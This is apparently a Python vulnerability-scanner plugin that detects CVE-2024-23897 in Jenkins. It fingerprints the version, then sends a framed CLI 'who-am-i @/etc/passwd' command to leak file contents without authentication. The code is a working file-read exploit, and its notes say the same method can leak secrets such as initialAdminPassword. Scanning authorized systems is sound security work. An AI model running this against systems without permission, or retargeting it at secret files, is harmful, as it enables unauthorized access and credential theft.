"""CVE-2024-23897 — Jenkins unauthenticated arbitrary file read.

Jenkins ships a built-in CLI whose command parser uses the args4j library. args4j
expands any argument of the form ``@<path>`` by substituting the *contents* of
that file. The Jenkins CLI endpoint (``/cli``) is reachable without
authentication, so an unauthenticated attacker can have Jenkins read an arbitrary
file off the controller filesystem and echo (the first few lines of) it back in
an error message. Authenticated users can read whole files; unauthenticated users
get the first one-to-three lines — more than enough to confirm the bug and to
leak ``/etc/passwd`` or ``secrets/initialAdminPassword``.

* CVSS 9.8 (Critical)
* Affected: Jenkins <= 2.441, LTS <= 2.426.2
* Patched: Jenkins 2.442+, LTS 2.426.3+
* Heavily exploited in the wild; ProjectDiscovery Nuclei template exists.

The probe is BENIGN: it reads ``/etc/passwd`` (a world-readable, non-sensitive
file present on every Linux host) and reports back the leaked lines as evidence.
No file is written, no command beyond the read is executed, and no secret-bearing
path is targeted by default.

Probe flow
----------
1. ``GET /login`` to fingerprint Jenkins and capture the ``X-Jenkins`` version
   header. A version ``<= 2.441`` (or LTS ``<= 2.426.2``) is in scope.
2. Drive the Jenkins CLI "download/upload" duplex protocol against
   ``/cli?remoting=false``:
     * a download session: ``POST /cli?remoting=false`` with a ``Session`` UUID
       header, held open to receive Jenkins' streamed reply
     * an upload session: ``POST /cli?remoting=false`` with the same ``Session``
       header carrying the args4j-framed command
       ``who-am-i @/etc/passwd``
   The ``@/etc/passwd`` argument is expanded by args4j; the resulting "no such
   command"/usage error echoes the file's first lines back in the response.
3. If the response contains ``root:`` (the canonical first line of
   ``/etc/passwd``) the file read is CONFIRMED → HIGH.
   If only the version fingerprint says "vulnerable" but the CLI read could not
   be confirmed → MEDIUM (worth a human's eyes).

Confidence matrix
-----------------
    * high   — CLI file-read leaked ``/etc/passwd`` content (``root:`` present).
    * medium — version fingerprint is in the vulnerable range but the CLI read
               could not be confirmed (endpoint changed, hardened, or filtered).
    * none   — not Jenkins, or a patched/unaffected version with no leak.

[Worker decision: plugin filename is cve_2024_23897.py (underscores) because the
runner discovers plugins via importlib and module names cannot contain hyphens.
The canonical id CVE-2024-23897 lives in metadata["vuln_id"], matching the
existing cve_2009_3548.py / miasma_redis_001.py convention.]
"""

from __future__ import annotations

import uuid
from typing import Any

import httpx

from miasma.core import Finding, Target

metadata = {
    "vuln_id": "CVE-2024-23897",
    "name": "Jenkins CLI Unauthenticated Arbitrary File Read",
    "description": (
        "Jenkins CLI command parser expands '@<path>' arguments into file "
        "contents (args4j). The /cli endpoint is reachable without "
        "authentication, letting an attacker read arbitrary files (e.g. "
        "/etc/passwd, secrets/initialAdminPassword) off the controller."
    ),
    "confidence": "high",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-23897",
        "https://www.jenkins.io/security/advisory/2024-01-24/",
    ],
    # Ports the probe will try, in order. Also the fallback when recon found
    # nothing. Exposed as port_hint per the improvement spec convention.
    "port_hint": [8080, 80, 443, 8090],
    "service_hint": ["http", "https"],
    "default_ports": [8080, 80, 443, 8090],
}

# Newest Jenkins weekly / LTS releases that are still vulnerable.
_MAX_WEEKLY = (2, 441)
_MAX_LTS = (2, 426, 2)

# Benign target file: world-readable, present on every Linux host, non-sensitive.
_PROBE_FILE = "/etc/passwd"

# Canonical first-line marker of /etc/passwd. Its presence in the CLI reply
# proves the file was read and echoed back.
_LEAK_MARKER = "root:"

_TIMEOUT = 8.0

# Cap how much of the streamed CLI reply we buffer — the leak is in the first
# few lines; a hostile endpoint must not be able to make us read unbounded data.
_MAX_REPLY_BYTES = 16384


def _candidate_ports(target: Target) -> list[int]:
    """Prefer recon-discovered open Jenkins-ish ports; else the port hints."""
    open_ports = target.open_ports()
    if open_ports:
        jenkins_like = [
            port
            for port in open_ports
            if "jenkins" in target.service(port).get("name", "").lower()
            or "jenkins" in target.service(port).get("product", "").lower()
            or port in metadata["port_hint"]
        ]
        return jenkins_like or open_ports
    return list(metadata["port_hint"])


def _scheme(port: int) -> str:
    return "https" if port == 443 else "http"


def _parse_version(version: str) -> tuple[int, ...] | None:
    """Parse '2.426.2' / '2.441' into a comparable int tuple (None if junk)."""
    head = version.strip().split("-", 1)[0]
    parts = head.split(".")
    try:
        return tuple(int(p) for p in parts)
    except ValueError:
        return None


def _is_vulnerable_version(version: str) -> bool:
    """True if a Jenkins version string is within the CVE-2024-23897 range.

    Weekly releases use ``MAJOR.MINOR`` (<= 2.441); LTS releases use
    ``MAJOR.MINOR.PATCH`` (<= 2.426.2). We classify by component count.
    """
    parsed = _parse_version(version)
    if parsed is None:
        return False
    if len(parsed) >= 3:  # LTS line (e.g. 2.426.2)
        return parsed[:3] <= _MAX_LTS
    # Weekly line (e.g. 2.441) — pad to 2 for a stable compare.
    padded = parsed + (0,) * (2 - len(parsed)) if len(parsed) < 2 else parsed
    return padded[:2] <= _MAX_WEEKLY


def _fingerprint(client: httpx.Client, base: str) -> tuple[bool, str | None]:
    """GET /login and read the X-Jenkins header.

    Returns ``(is_jenkins, version)``. ``version`` is None when the header is
    absent (older builds sometimes omit it); presence of any X-Jenkins header
    is itself the Jenkins signature.
    """
    try:
        resp = client.get(f"{base}/login")
    except httpx.HTTPError:
        return False, None
    version = resp.headers.get("X-Jenkins")
    if version is not None:
        return True, version
    # Fallback signature: the X-Jenkins-Session header or login page marker.
    if "X-Jenkins-Session" in resp.headers or "Jenkins" in resp.text:
        return True, None
    return False, None


def _build_cli_command() -> bytes:
    """Frame the ``who-am-i @/etc/passwd`` command in the CLI args protocol.

    The CLI wire protocol frames each argument as a 4-byte big-endian length
    followed by a 1-byte op (0 = Arg) and the UTF-8 argument bytes. The final
    0-length frame with op 3 (Start) tells Jenkins to dispatch.
    """
    frames = bytearray()

    def _arg(text: str) -> None:
        payload = text.encode("utf-8")
        frames.extend(len(payload).to_bytes(4, "big"))
        frames.append(0)  # op 0 = Arg
        frames.extend(payload)

    _arg("who-am-i")
    _arg(f"@{_PROBE_FILE}")
    # Start operation: zero-length frame, op 3.
    frames.extend((0).to_bytes(4, "big"))
    frames.append(3)
    return bytes(frames)


def _attempt_cli_read(
    client: httpx.Client, base: str
) -> tuple[bool, str | None]:
    """Drive the duplex CLI protocol to read /etc/passwd.

    Returns ``(leaked, reply_excerpt)``. ``leaked`` is True when the file's
    ``root:`` marker appears in either streamed reply. ``reply_excerpt`` is a
    short slice of whichever response carried the leak (or the upload reply) so
    a human can confirm by eye.
    """
    session = str(uuid.uuid4())
    cli_url = f"{base}/cli?remoting=false"
    headers_common = {"Session": session}

    upload_reply: str | None = None
    download_reply: str | None = None

    # Upload session: carries the framed command. Some hardened deployments need
    # the download session opened first; we send the upload (which is what
    # actually triggers the args4j expansion) and read its synchronous reply,
    # then read the download stream for the echoed error.
    try:
        up = client.post(
            cli_url,
            headers={
                **headers_common,
                "Side": "upload",
                "Content-Type": "application/octet-stream",
            },
            content=_build_cli_command(),
        )
        upload_reply = up.text[:_MAX_REPLY_BYTES]
    except httpx.HTTPError:
        upload_reply = None

    try:
        down = client.post(
            cli_url,
            headers={**headers_common, "Side": "download"},
            content=b"",
        )
        download_reply = down.text[:_MAX_REPLY_BYTES]
    except httpx.HTTPError:
        download_reply = None

    for reply in (download_reply, upload_reply):
        if reply and _LEAK_MARKER in reply:
            return True, reply[:1000]

    excerpt = download_reply or upload_reply
    return False, (excerpt[:1000] if excerpt else None)


def probe(target: Target) -> Finding | None:
    for port in _candidate_ports(target):
        base = f"{_scheme(port)}://{target.host}:{port}"

        try:
            client = httpx.Client(
                timeout=_TIMEOUT, verify=False, follow_redirects=False
            )
        except httpx.HTTPError:
            continue

        with client:
            is_jenkins, version = _fingerprint(client, base)
            if not is_jenkins:
                continue

            evidence: dict[str, Any] = {
                "host": target.host,
                "port": port,
            }
            if version is not None:
                evidence["jenkins_version"] = version

            version_vuln = version is not None and _is_vulnerable_version(version)

            leaked, reply_excerpt = _attempt_cli_read(client, base)

            # --- HIGH: the CLI read actually leaked file content ---
            if leaked:
                evidence["file_read_confirmed"] = True
                evidence["probe_file"] = _PROBE_FILE
                if reply_excerpt is not None:
                    evidence["leak_excerpt"] = reply_excerpt
                description = (
                    metadata["description"]
                    + f" Confirmed: the CLI leaked the contents of {_PROBE_FILE}"
                    " in response to an unauthenticated request."
                )
                return Finding(
                    vuln_id=metadata["vuln_id"],
                    host=target.host,
                    confidence="high",
                    evidence=evidence,
                    description=description,
                )

            # --- MEDIUM: vulnerable version, but read not confirmed ---
            if version_vuln:
                evidence["file_read_confirmed"] = False
                evidence["version_in_scope"] = True
                if reply_excerpt is not None:
                    evidence["cli_reply_excerpt"] = reply_excerpt
                description = (
                    metadata["description"]
                    + f" Reported version {version} is within the vulnerable "
                    "range (weekly <= 2.441 / LTS <= 2.426.2), but the CLI "
                    "file-read could not be confirmed on this probe — worth a "
                    "manual check."
                )
                return Finding(
                    vuln_id=metadata["vuln_id"],
                    host=target.host,
                    confidence="medium",
                    evidence=evidence,
                    description=description,
                )

            # Jenkins present but patched / out of scope and no leak — skip.

    return None
